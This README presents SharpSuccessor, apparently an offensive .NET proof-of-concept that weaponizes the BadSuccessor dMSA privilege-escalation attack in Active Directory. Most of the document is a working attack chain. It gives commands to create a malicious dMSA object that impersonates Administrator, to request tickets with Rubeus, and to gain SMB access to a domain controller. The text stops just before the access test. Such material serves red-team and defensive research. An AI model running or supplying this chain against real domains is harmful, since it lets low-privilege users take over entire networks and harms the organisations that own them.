# SharpSuccessor

SharpSuccessor is a .NET Proof of Concept (POC) for fully weaponizing Yuval Gordonâ€™s ([@YuG0rd](https://x.com/YuG0rd)) [BadSuccessor](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory) attack from Akamai. A low privilege user with `CreateChild` permissions over any Organizational Unit (OU) in the Active Directory domain with write access on a target object can perform account takeover.

Use SharpSuccessor to add and weaponize the dMSA object, as well as write the proper attributes on the target account you wish to impersonate:
```
SharpSuccessor.exe add /impersonate:Administrator /path:"ou=test,dc=lab,dc=lan" /account:jdoe /name:attacker_dMSA
```

Request a TGT as the current user context, in this case `jdoe`:
```
Rubeus.exe tgtdeleg /nowrap
```

Then use that tgt to impersonate the dMSA account:
```
Rubeus.exe asktgs /targetuser:attacker_dmsa$ /service:krbtgt/lab.lan /opsec /dmsa /nowrap /ptt /ticket:doIFTDCCB.....
```

Now you can request a service ticket with Administrator context for any SPN, including the Domain Controllers for post-exploitation. For example here I will show admin privileges for SMB on the domain controller:

```
Rubeus.exe asktgs /user:attacker_dmsa$ /service:cifs/WIN-RAEAN26UGJ5.lab.lan /opsec /dmsa /nowrap /ptt /ticket:doIF2DCCBdS...
```

Now that we have the ticket in memory, we can test access:
